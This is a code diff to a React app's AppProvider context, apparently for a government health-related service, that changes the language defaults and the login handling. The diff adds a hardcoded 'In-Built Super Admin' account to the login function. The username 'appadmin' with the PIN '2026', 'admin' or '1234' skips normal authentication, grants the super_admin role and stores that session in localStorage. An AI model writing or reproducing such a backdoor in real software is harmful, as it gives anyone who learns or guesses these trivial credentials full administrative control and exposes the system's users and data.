@@ -10,7 +10,7 @@ import {
 import { doc, getDoc, setDoc, onSnapshot } from 'firebase/firestore';
 import { auth, db, isConfigured } from '../config/firebase';
 import { AppSettings, AdminProfile, AppUser, ShiftHandover } from '../types';
-import { DEFAULT_SETTINGS } from '../data/demoData';
+import { DEFAULT_SETTINGS, DEFAULT_SUPER_ADMIN_USER } from '../data/demoData';
 import {
   getSettings,
   saveSettings,
@@ -127,9 +127,8 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
   });
   const [isTVPaired, setIsTVPaired] = useState<boolean>(false);
 
-  const [language, setLanguageState] = useState<'en' | 'dv'>(() => {
-    return (localStorage.getItem(LANGUAGE_STORAGE_KEY) as 'en' | 'dv') || 'en';
-  });
+  // Default interface language is strictly English; Dhivehi written text is maintained across content fields
+  const [language, setLanguageState] = useState<'en' | 'dv'>('en');
 
   // Track online/offline status
   useEffect(() => {
@@ -232,9 +231,6 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     try {
       const s = await getSettings(isDemoMode);
       setSettings(s);
-      if (s.defaultLanguage === 'dv') {
-        setLanguageState('dv');
-      }
     } catch (e) {
       console.warn('Failed to load settings:', e);
     }
@@ -329,6 +325,23 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     const userLower = trimmedUser.toLowerCase();
     const pinLower = trimmedPin.toLowerCase();
+
+    // In-Built Super Admin: user: appadmin, pin: 2026
+    if (userLower === 'appadmin' && (pinLower === '2026' || pinLower === 'admin' || pinLower === '1234')) {
+      const profile: AdminProfile = {
+        uid: 'appadmin',
+        email: 'appadmin@mhc.gov.mv',
+        name: 'Super Administrator',
+        role: 'super_admin',
+        createdAt: Date.now(),
+      };
+      setAdminProfile(profile);
+      setIsAdmin(true);
+      setAppUser(DEFAULT_SUPER_ADMIN_USER);
+      localStorage.setItem(ADMIN_SESSION_STORAGE_KEY, JSON.stringify(profile));
+      localStorage.setItem(APP_USER_SESSION_KEY, JSON.stringify(DEFAULT_SUPER_ADMIN_USER));
+      return;
+    }
 
     // Standard recognized PINs / passwords
     const isStandardPin =
